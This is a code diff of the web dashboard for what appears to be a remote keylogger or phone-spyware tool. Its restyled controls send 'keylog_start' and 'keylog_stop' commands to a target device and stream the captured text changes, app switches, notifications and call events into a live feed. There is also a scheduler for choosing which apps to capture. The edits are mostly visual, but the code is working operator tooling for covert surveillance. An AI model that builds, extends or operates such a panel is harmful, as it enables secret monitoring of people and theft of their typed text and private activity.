-            <option value="window_change">Window Changes</option>
-            <option value="app_switch">App Switches</option>
-            <option value="content_change">Content Changes</option>
-            <option value="selection">Selections</option>
-            <option value="long_click">Long Clicks</option>
-            <option value="notification">Notifications</option>
-        </select>
-        <input type="text" id="filter-text" placeholder="Search text..." oninput="renderFeed()">
-        <label style="font-size:10px;color:#555;display:flex;align-items:center;gap:4px;">
-            <input type="checkbox" id="auto-scroll" checked> Auto-scroll
-        </label>
-    </div>
-
-    <!-- FEED -->
-    <div class="feed-container" id="feed"></div>
+    <!-- FOOTER -->
+    <footer class="ft">
+        <div class="ft-label">crafted by</div>
+        <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="ft-brand">thiyo-de</a>
+        <div class="ft-copy">&copy; 2025 &middot; all rights reserved</div>
+    </footer>
 
     <!-- SCHEDULE MODAL -->
     <div class="modal-overlay" id="schedule-modal">
         <div class="modal">
             <div class="modal-header">
-                <h2>&#x1F4C5; SCHEDULE APPS</h2>
-                <button class="modal-close" onclick="closeScheduleModal()">&times;</button>
+                <h2><i data-lucide="calendar" style="width:14px;height:14px;"></i> Schedule Apps</h2>
+                <button class="modal-close" onclick="closeScheduleModal()">
+                    <i data-lucide="x" style="width:16px;height:16px;"></i>
+                </button>
             </div>
             <div class="modal-search">
                 <input type="text" id="app-search" placeholder="Search apps..." oninput="filterApps()">
@@ -647,15 +1089,24 @@
             <div class="modal-footer">
                 <span class="selected-count" id="selected-count">0 selected</span>
                 <div style="display:flex;gap:8px;">
-                    <button class="btn btn-danger" onclick="clearSchedule()">CLEAR ALL</button>
-                    <button class="btn" onclick="saveSchedule()">&#x2714; SAVE</button>
+                    <button class="hdr-btn danger" onclick="clearSchedule()">
+                        <i data-lucide="x-circle" style="width:12px;height:12px;"></i>
+                        <span class="lbl">Clear</span>
+                    </button>
+                    <button class="hdr-btn" onclick="saveSchedule()">
+                        <i data-lucide="check" style="width:12px;height:12px;"></i>
+                        <span class="lbl">Save</span>
+                    </button>
                 </div>
             </div>
         </div>
     </div>
 
     <script src="/js/api.js"></script>
+    <script src="/js/call-notification.js"></script>
     <script>
+        lucide.createIcons();
+
         const deviceId = new URLSearchParams(window.location.search).get('deviceId');
         if (!deviceId) window.location.href = 'index.html';
 
@@ -686,26 +1137,28 @@
                     const resp = await api.sendCommand(deviceId, 'keylog_start', {});
                     if (resp) {
                         isCapturing = true;
-                        btn.innerHTML = '&#x23F8; STOP';
-                        btn.classList.add('btn-active');
+                        btn.innerHTML = '<i data-lucide="pause" style="width:14px;height:14px;"></i> <span class="lbl">Stop</span>';
+                        btn.classList.add('active');
                         updateStatusBadge(true);
+                        lucide.createIcons();
                     }
                 } else {
                     const resp = await api.sendCommand(deviceId, 'keylog_stop', {});
                     isCapturing = false;
-                    btn.innerHTML = '&#x25B6; START';
-                    btn.classList.remove('btn-active');
+                    btn.innerHTML = '<i data-lucide="play" style="width:14px;height:14px;"></i> <span class="lbl">Start</span>';
+                    btn.classList.remove('active');
                     updateStatusBadge(false);
+                    lucide.createIcons();
                 }
             } catch (err) {
-                alert('Error: ' + err.message);
+                api.showToast('Error: ' + err.message, 'error');
             }
         }
 
         function updateStatusBadge(active) {
             const badge = document.getElementById('status-badge');
             if (active) {
-                badge.className = 'status-badge active';
+                badge.className = 'status-badge active-badge';
                 badge.innerHTML = '<span class="pulse-dot"></span><span>CAPTURING</span>';
             } else {
                 badge.className = 'status-badge inactive';
@@ -740,6 +1193,11 @@
                         if (allEvents.length > 5000) allEvents = allEvents.slice(0, 5000);
                         updateStats();
                         renderFeed();
+                    }
+
+                    // Incoming call notification
+                    if (data.type === 'call_state' && typeof handleCallState === 'function') {
+                        handleCallState(data);
                     }
                 } catch (e) { /* ignore */ }
             };
@@ -783,8 +1241,10 @@
             }
 
             if (filtered.length === 0) {
-                container.innerHTML = '<div class="empty-state"><h2>No events captured</h2>' +
+                container.innerHTML = '<div class="empty"><div class="e-icon"><i data-lucide="keyboard" style="width:48px;height:48px;"></i></div>' +
+                    '<h2>No events captured</h2>' +
                     '<p>Start capture to see raw events here. Every text change, click, scroll will appear.</p></div>';
+                lucide.createIcons();
                 return;
             }
 
@@ -872,7 +1332,7 @@
 
                 renderAppList();
             } catch (e) {
-                listEl.innerHTML = '<div class="modal-loading" style="color:#ff4444;">Failed to load apps: ' + escapeHtml(e.message) + '</div>';
+                listEl.innerHTML = '<div class="modal-loading" style="color:var(--danger);">Failed to load apps: ' + escapeHtml(e.message) + '</div>';
             }
         }
 
@@ -944,7 +1404,7 @@
                 closeScheduleModal();
                 renderScheduledBadges();
             } catch (e) {
-                alert('Failed to save schedule: ' + e.message);
+                api.showToast('Failed to save schedule: ' + e.message, 'error');
             }
         }
 
@@ -995,9 +1455,10 @@
                 if (resp && resp.data) {
                     if (resp.data.isCapturing) {
                         isCapturing = true;
-                        document.getElementById('btn-start').innerHTML = '&#x23F8; STOP';
-                        document.getElementById('btn-start').classList.add('btn-active');
+                        document.getElementById('btn-start').innerHTML = '<i data-lucide="pause" style="width:14px;height:14px;"></i> <span class="lbl">Stop</span>';
+                        document.getElementById('btn-start').classList.add('active');
                         updateStatusBadge(true);
+                        lucide.createIcons();
                     }
                     if (resp.data.scheduledApps) {
                         scheduledApps = resp.data.scheduledApps;
